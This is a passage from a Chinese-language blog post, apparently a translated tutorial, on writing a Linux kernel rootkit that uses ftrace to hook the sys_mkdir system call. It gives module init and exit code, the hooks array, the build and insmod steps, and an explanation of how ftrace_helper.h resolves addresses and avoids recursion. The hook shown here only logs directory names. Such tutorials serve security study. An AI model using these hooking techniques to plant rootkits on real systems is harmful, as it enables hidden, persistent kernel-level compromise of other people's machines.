<p>不过我们先要做的，还是定义好<code>Ftrace</code>用于处理hook的函数的数组。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">ftrace_hook</span> <span class="title">hook</span>[] = &#123;</span></span><br><span class="line">    HOOK(<span class="string">"sys_mkdir"</span>, hook_mkdir, &amp;orig_mkdir),</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p><code>HOOK</code>宏函数需要传递的参数如下：</p>
<ul>
<li><code>.name</code>: hook的系统调用函数的名称或内核函数的名称，我们这里hook的目标函数是<code>sys_mkdir()</code>函数。</li>
<li><code>.function</code>: 写好的用于hook的<code>hook_mkdir()</code>函数。</li>
<li><code>.original</code>: 存储在<code>orig_mkdir</code>中原本的系统调用函数的地址。</li>
</ul>
<p>要注意的是，<code>hook[]</code>数组能够一次性包含多个hook函数实现复杂的rookit。</p>
<p>一旦<code>hook[]</code>这个数组设置好后，就可以用<code>fh_install_hooks()</code>给函数安装钩子，用<code>fh_remove_hooks()</code>将钩子卸载掉。具体需要做的就只用将<code>fh_install_hooks()</code>和<code>fh_remove_hooks()</code>分别放到init和exit函数中，并用if检查这两个函数是否成功运行。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __<span class="function">init <span class="title">rootkit_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> err;</span><br><span class="line">    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));</span><br><span class="line">    <span class="keyword">if</span>(err)</span><br><span class="line">        <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">    printk(KERN_INFO <span class="string">"rootkit: loaded\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __<span class="function"><span class="built_in">exit</span> <span class="title">rootkit_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));</span><br><span class="line">    printk(KERN_INFO <span class="string">"rootkit: unloaded\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(rootkit_init);</span><br><span class="line">module_exit(rootkit_exit);</span><br></pre></td></tr></table></figure>
<p>下载好<a href="https://gist.github.com/xcellerator/ac2c039a6bbd7782106218298f5e5ac1" target="_blank" rel="noopener">3个编译所需要的文件</a>，就可以开始编译了。<code>make</code>指令运行完成后，在当前目录下会生成一个<code>rookit.ko</code>文件。用<code>insmod rookit.ko</code>在操作系统内核中加载<code>rookit.ko</code>模块，接着利用<code>mkdir</code>指令创建一个文件夹。拉起hook函数之后，<code>dmesg</code>可以查看到<code>rookit.ko</code>在内核中的输出。具体的命令行的输入如下：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> sudo dmesg -C</span><br><span class="line"><span class="meta">$</span> sudo insmod rootkit.ko</span><br><span class="line"><span class="meta">$</span> mkdir lol</span><br><span class="line"><span class="meta">$</span> dmesg</span><br><span class="line">[ 3271.730008] rootkit: loaded</span><br><span class="line">[ 3276.335671] rootkit: trying to create directory with name: lol</span><br></pre></td></tr></table></figure></p>
<p>获得了上面的输出之后，说明我们已经成功hook了<code>sys_mkdir</code>系统调用函数。Ftrace已经保证了<code>orig_mkdir</code>会指向原本的<code>sys_mkdir</code>系统调用函数，因此只要在我们的hook函数中直接调用就可以了，不用了解太多的细节。</p>
<p>考虑到未来rookits通用性，我们需要写一个新的hook函数，让其适用于任意目标函数(想hook的函数)，此外，还需要重写<code>hook[]</code>数组和其他的小细节。</p>
<blockquote>
<p>这里指出一点，我们只能hook内核中export出来的函数。<code>/proc/kallsyms</code>可以列出所有内核export出来的函数，不过在用的时候记得在前面加上<code>sudo</code>，不然出现的内存地址会都是<code>0x0</code>。显然，所有的系统调用函数都需要内核export出来，这样用户空间中运行的代码才能去找到它，不过内核中也有我们感兴趣的函数是非系统调用函数的(这些函数也会被内核暴露出来的)，这个我们后续会再进行介绍。</p>
</blockquote>
<h2 id="2-5-福利：ftrace-helper-h的细节介绍"><a href="#2-5-福利：ftrace-helper-h的细节介绍" class="headerlink" title="2.5 福利：ftrace_helper.h的细节介绍"></a>2.5 福利：<code>ftrace_helper.h</code>的细节介绍</h2><p>看到这里，就是说你想更了解<code>ftrace</code>在rookit中到底做了些什么。简单来说，rookit利用了<code>Ftrace</code>函数可以attach一个内核的callback函数。(翻译到这里我突然想起今年的BlackHat的<a href="https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-Fixing-A-Memory-Forensics-Blind-Spot-Linux-Kernel-Tracing-wp.pdf" target="_blank" rel="noopener">Fixing a Memory Forensics Blind Spot: Linux Kernel Tracing</a>]议题介绍了Linux Kernel Tracing的内容，里面也提及到了Ftrace、kprobes、eBFP和tracepoints这些用于hook内核函数的方法，感兴趣的可以看看)。具体点说，我们可以在任何时候让ftrace单步执行<code>rip</code>寄存器中包含的一个具体的内存地址。如果我们设的是<code>sys_mkdir</code>系统调用函数的地址，利用ftrace我们可以用另外一个函数替换<code>sys_mkdir</code>运行。</p>
<p>Ftrace所有需要掌握的信息，实际上就是封装到<code>ftrace_hook</code>结构体中的内容。由于我们想要实现一次性hook多个函数，所以在代码中就使用了<code>hooks[]</code>数组。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">static struct ftrace_hook hooks[] = &#123;</span><br><span class="line">    HOOK(&quot;sys_mkdir&quot;, hook_mkdir, &amp;orig_mkdir),</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p><code>hooks[]</code>数组有一点需要拆开来讲的，首先，我们来看看<a href="https://gist.github.com/xcellerator/ac2c039a6bbd7782106218298f5e5ac1#file-ftrace_helper-h" target="_blank" rel="noopener"><code>ftrace_helper.h</code></a>源码中的<code>ftrace_hook</code>结构体。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ftrace_hook</span> &#123;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *name;</span><br><span class="line">    <span class="keyword">void</span> *function;</span><br><span class="line">    <span class="keyword">void</span> *original;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> address;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ftrace_ops</span> <span class="title">ops</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>利用<code>HOOK</code>宏，能够更加简单快速地给结构体赋值：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HOOK(_name, _hook, _orig) \</span></span><br><span class="line">&#123; \</span><br><span class="line">    .name = SYSCALL_NAME(_name), \</span><br><span class="line">    .function = (_hook), \</span><br><span class="line">    .original = (_orig), \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>使用到<code>SYSCALL_NAME</code>宏是因为考虑到在64位的Linux内核中，系统调用函数在他们的函数名称前会带有<code>__64_</code>的前缀。</p>
</blockquote>
<p>结构体的部分介绍起来挺简单的，现在我们该看看<code>fh_install_hooks()</code>函数了，该函数是实现hook功能重要的一环。骗你的，我只是利用这种方式来提醒你们，<code>fh_install_hooks()</code>仅仅利用循环实现了<code>hooks[]</code>数组遍历以及为数组中每个内核函数调用<code>fh_install_hook()</code>函数。</p>
<p><code>fh_install_hook()</code>函数中第一步就是调用<code>fh_resolve_hook_address()</code>，并给该函数传递一个作为参数的<code>ftrace_hook</code>对象。<code>fh_install_hook()</code>函数用了<code>&lt;linux/kallsyms.h&gt;</code>头文件提供的<code>kallsyms_lookup_name()</code>函数获取原本系统调用函数加载到内存中的地址，比如在我们想要的应用场景中就是获取<code>sys_mkdir</code>系统调用函数的内存加载地址。获取内存地址的这个步骤很重要，考虑到<code>orig_mkdir()</code>函数需要分配系统调用函数的内存加载地址，以及我们编写的rookit内核模块在重加载的时候需要恢复运行环境，所以保存获取的内存地址是很有必要的。源码中，将获取的系统调用函数加载地址保存在<code>ftrace_hook</code>结构体中的<code>.address</code>字段中。</p>
<p>下面，来看看<a href="https://gist.github.com/xcellerator/ac2c039a6bbd7782106218298f5e5ac1#file-ftrace_helper-h" target="_blank" rel="noopener"><code>ftrace_helper.h</code></a>源码中略显诡异的预处理声明：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#if USE_FENTRY_OFFSET</span><br><span class="line">    *((unsigned long*) hook-&gt;original) = hook-&gt;address + MCOUNT_INSN_SIZE;</span><br><span class="line">#else</span><br><span class="line">    *((unsigned long*) hook-&gt;original) = hook-&gt;address;</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure></p>
<p>想要理解上面的声明，需要先想到在我们尝试hook函数的时候使用递归可能会面临的风险。主要有两种思路可以避免这个风险，第一种是利用函数返回的地址监测递归，第二种就直接用上面的<code>+ MCOUNT_INSN_SIZE</code>跳过ftrace的调用(在Linux内核的源码中，<a href="https://www.kernel.org/doc/Documentation/trace/ftrace-design.txt" target="_blank" rel="noopener"><code>MCOUNT_INSN_SIZE</code></a>表示着<code>mcount()</code>函数总体的大小，而<code>mcount()</code>函数又会用<code>ftrace_caller()</code>调用ftrace，所以在hook地址上加上<code>MCOUNT_INSN_SIZE</code>就能跳过ftrace的调用，从而避免Ftrace在hook函数调用<code>orig_mkdir</code>后又再次调用该函数，让递归陷入死循环的情况)。通过判断<code>USE_FENTRY_OFFSET</code>的值，源码选择不同的方式避免递归死循环。当<code>USE_FENTRY_OFFSET</code>的值为0的时候，使用用返回地址监测递归的方法，为1的时候用第二种方法。</p>
<p>如果想使用第一种方式监测递归，那就需要关闭ftrace提供的保护机制（ftrace会恢复现场，也就是恢复rip寄存器的值，因此调用了ftrace之后会无止境地递归hook函数）。ftrace内置的保护机制需要利用保存在<code>rip</code>中函数返回地址，不过如果我们仍旧要用<code>rip</code>的话，还是需要有保护机制的，因此最后需要用我们自己的保护机制替换掉ftrace内置的保护机制。这些可以利用<code>ftrace_hook</code>结构体中的<code>.original</code>字段实现，<code>.original</code>字段存着<code>.name</code>字段对应的系统调用函数的内存地址。</p>
<p>下一个介绍<code>fh_install_hook()</code>的就是<code>ftrace_hook</code>结构体的<code>.ops</code>字段，该字段自己本身就是一个带有两个字段的结构体。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hook-&gt;ops.func = fh_ftrace_thunk;</span><br><span class="line">hook-&gt;ops.flags = FTRACE_OPS_FL_SAVE_REGS</span><br><span class="line">                | FTRACE_OPS_FL_RECURSION_SAFE</span><br><span class="line">                | FTRACE_OPS_FL_IPMODIFY;</span><br></pre></td></tr></table></figure></p>
<h1 id="3-参考文章"><a href="#3-参考文章" class="headerlink" title="3 参考文章"></a>3 参考文章</h1><ul>
<li><a href="https://www.fireeye.com/blog/threat-research/2018/04/loading-kernel-shellcode.html" target="_blank" rel="noopener">Loading Kernel Shellcode</a></li>
<li><a href="https://www.exploit-db.com/docs/english/21013-shellcoding-in-linux.pdf" target="_blank" rel="noopener">Shellcoding in Linux</a></li>
</ul>

                </article>
                <ul class="tags-postTags">
                    
                    <li>
                        <a href="/tags/Linux-Rookit-翻译/" rel="tag"># Linux Rookit 翻译</a>
                    </li>
                    
                </ul>
            </div>
        </div>
    </div>

    
    <nav id="gobottom" class="pagination">
        
        <span class="prev-next-post">·</span>
        
        <a class="next-post" title="获取APK中第三方库信息的工具" href="/2020/01/29/获取APK中第三方库信息的工具/">
            获取APK中第三方库信息的工具 →
        </a>
        
    </nav>

    
    <div class="inner">
        <div id="comment"></div>
    </div>
    
</div>

<div class="toc-bar">
    <div class="toc-btn-bar">
        <a href="#site-main" class="toc-btn">
            <svg viewbox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg"><path d="M793.024 710.272a32 32 0 1 0 45.952-44.544l-310.304-320a32 32 0 0 0-46.4 0.48l-297.696 320a32 32 0 0 0 46.848 43.584l274.752-295.328 286.848 295.808z"/></svg>
        </a>
        <div class="toc-btn toc-switch">
            <svg class="toc-open" viewbox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg"><path d="M779.776 480h-387.2a32 32 0 0 0 0 64h387.2a32 32 0 0 0 0-64M779.776 672h-387.2a32 32 0 0 0 0 64h387.2a32 32 0 0 0 0-64M256 288a32 32 0 1 0 0 64 32 32 0 0 0 0-64M392.576 352h387.2a32 32 0 0 0 0-64h-387.2a32 32 0 0 0 0 64M256 480a32 32 0 1 0 0 64 32 32 0 0 0 0-64M256 672a32 32 0 1 0 0 64 32 32 0 0 0 0-64"/></svg>
            <svg class="toc-close hide" viewbox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg"><path d="M512 960c-247.039484 0-448-200.960516-448-448S264.960516 64 512 64 960 264.960516 960 512 759.039484 960 512 960zM512 128.287273c-211.584464 0-383.712727 172.128262-383.712727 383.712727 0 211.551781 172.128262 383.712727 383.712727 383.712727 211.551781 0 383.712727-172.159226 383.712727-383.712727C895.712727 300.415536 723.551781 128.287273 512 128.287273z"/><path d="M557.05545 513.376159l138.367639-136.864185c12.576374-12.416396 12.672705-32.671738 0.25631-45.248112s-32.704421-12.672705-45.248112-0.25631l-138.560301 137.024163-136.447897-136.864185c-12.512727-12.512727-32.735385-12.576374-45.248112-0.063647-12.512727 12.480043-12.54369 32.735385-0.063647 45.248112l136.255235 136.671523-137.376804 135.904314c-12.576374 12.447359-12.672705 32.671738-0.25631 45.248112 6.271845 6.335493 14.496116 9.504099 22.751351 9.504099 8.12794 0 16.25588-3.103239 22.496761-9.247789l137.567746-136.064292 138.687596 139.136568c6.240882 6.271845 14.432469 9.407768 22.65674 9.407768 8.191587 0 16.352211-3.135923 22.591372-9.34412 12.512727-12.480043 12.54369-32.704421 0.063647-45.248112L557.05545 513.376159z"/></svg>
        </div>
        <a href="#gobottom" class="toc-btn">
            <svg viewbox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg"><path d="M231.424 346.208a32 32 0 0 0-46.848 43.584l297.696 320a32 32 0 0 0 46.4 0.48l310.304-320a32 32 0 1 0-45.952-44.544l-286.848 295.808-274.752-295.36z"/></svg>
        </a>
    </div>
    <div class="toc-main">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-前言"><span class="toc-text">1 前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-正文"><span class="toc-text">2 正文</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1-Linux在用户态中调用syscalls"><span class="toc-text">2.1 Linux在用户态中调用syscalls</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2-内核处理syscalls的过程"><span class="toc-text">2.2 内核处理syscalls的过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-3-首次写hook系统调用函数的函数"><span class="toc-text">2.3 首次写hook系统调用函数的函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-4-用Ftrace-Hook函数"><span class="toc-text">2.4 用Ftrace Hook函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-5-福利：ftrace-helper-h的细节介绍"><span class="toc-text">2.5 福利：ftrace_helper.h的细节介绍</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-参考文章"><span class="toc-text">3 参考文章</span></a></li></ol>
    </div>
</div>



<!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>

    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">

        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                <!--  Controls are self-explanatory. Order can be changed. -->

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <!-- Preloader demo https://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                      <div class="pswp__preloader__cut">
                        <div class="pswp__preloader__donut"></div>
                      </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div> 
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div>




	</div>
	


<aside class="read-next outer">
    <div class="inner">
        <div class="read-next-feed">
            
            

<article class="read-next-card" style="background-image: url(https://res.cloudinary.com/dq4c0zqqy/image/upload/v1628223437/blog_setting/IMG_20210510_200604.jpg)">
  <header class="read-next-card-header">
    <small class="read-next-card-header-sitetitle">&mdash; Se8S0n &mdash;</small>
    <h3 class="read-next-card-header-title">Recent Posts</h3>
  </header>
  <div class="read-next-divider">
    <svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24">
      <path d="M13 14.5s2 3 5 3 5.5-2.463 5.5-5.5S21 6.5 18 6.5c-5 0-7 11-12 11C2.962 17.5.5 15.037.5 12S3 6.5 6 6.5s4.5 3.5 4.5 3.5"/>
    </svg>
  </div>
  <div class="read-next-card-content">
    <ul>
      
      
      
      <li>
        <a href="/2021/08/22/Linux-Rookit教程2：Ftrace和Hook函数/">Linux Rookit 教程(2)：Ftrace和Hook函数</a>
      </li>
      
      
      
      <li>
        <a href="/2020/01/29/获取APK中第三方库信息的工具/">获取APK中第三方库信息的工具</a>
      </li>
      
      
      
      <li>
        <a href="/2019/11/05/从OWASP-CrackMe学Android逆向-二/">从OWASP CrackMe学Android逆向(二)</a>
      </li>
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
    </ul>
  </div>
  <footer class="read-next-card-footer">
    <a href="/archives">  MORE  → </a>
  </footer>
</article>

            
            
            


            
            
            

<article class="read-next-card" style="background-image: url(https://res.cloudinary.com/dq4c0zqqy/image/upload/v1628223437/blog_setting/IMG_20210510_200604.jpg)">
	<header class="read-next-card-header tagcloud-card">
		<h3 class="read-next-card-header-title">Tag Cloud</h3>
	</header>
	<div class="read-next-card-content-ext">
		<a href="/tags/Android/" style="font-size: 20.67px;">Android</a> <a href="/tags/Android-渗透/" style="font-size: 14px;">Android 渗透</a> <a href="/tags/Android安全-翻译/" style="font-size: 17.33px;">Android安全 翻译</a> <a href="/tags/Android逆向/" style="font-size: 20.67px;">Android逆向</a> <a href="/tags/HTTP/" style="font-size: 24px;">HTTP</a> <a href="/tags/Linux-Rookit-翻译/" style="font-size: 14px;">Linux Rookit 翻译</a> <a href="/tags/机器学习/" style="font-size: 14px;">机器学习</a>
	</div>
</article>

            
        </div>
    </div>
</aside>

	




<div id="search" class="search-overlay">
    <div class="search-form">
        
        <div class="search-overlay-logo">
        	<img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1628223674/blog_setting/unnamed.jpg" alt="Se8S0n">
        </div>
        
        <input id="local-search-input" class="search-input" type="text" name="search" placeholder="Search ...">
        <a class="search-overlay-close" href="#"></a>
    </div>
    <div id="local-search-result"></div>
</div>

<footer class="site-footer outer">
	<div class="site-footer-content inner">
		<div class="copyright">
			<a href="/" title="Se8S0n">Se8S0n &copy; 2021</a>
			
				
			        <span hidden="true" id="/2021/08/22/Linux-Rookit教程2：Ftrace和Hook函数/" class="leancloud-visitors" data-flag-title="Linux Rookit 教程(2)：Ftrace和Hook函数">
			            <span>阅读量 </span>
			            <span class="leancloud-visitors-count">0</span>
			        </span>
	    		
    		
		</div>
		<nav class="site-footer-nav">
			
			<a href="https://hexo.io" title="Hexo" target="_blank" rel="noopener">Hexo</a>
			<a href="https://github.com/xzhih/hexo-theme-casper" title="Casper" target="_blank" rel="noopener">Casper</a>
		</nav>
	</div>
</footer>
	


<script>
    if(window.navigator && navigator.serviceWorker) {
        navigator.serviceWorker.getRegistrations().then(function(registrations) {
            for(let registration of registrations) {
                registration.unregister()
            }
        })
    }
</script>


<script id="scriptLoad" src="/js/allinone.min.js" async></script>


<script>
    document.getElementById('scriptLoad').addEventListener('load', function () {
        
        
            var bLazy = new Blazy();
        

        
        

        
        
        
            searchFunc("/");
        
        
    })
</script>



<link rel="stylesheet" href="/photoswipe/photoswipe.css">
<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
<script src="/photoswipe/photoswipe.min.js"></script>
<script src="/photoswipe/photoswipe-ui-default.min.js"></script>




<script id="valineScript" src="//unpkg.com/valine/dist/Valine.min.js" async></script>
<script>
    document.getElementById('valineScript').addEventListener("load", function() {
        new Valine({
            el: '#comment' ,
            verify: false,
            notify: false,
            appId: '',
            appKey: '',
            placeholder: '......# comment box placeholder',
            pageSize: 10,
            avatar: 'mm',
            visitor: true
        })
    });
</script>





</body>
</html>
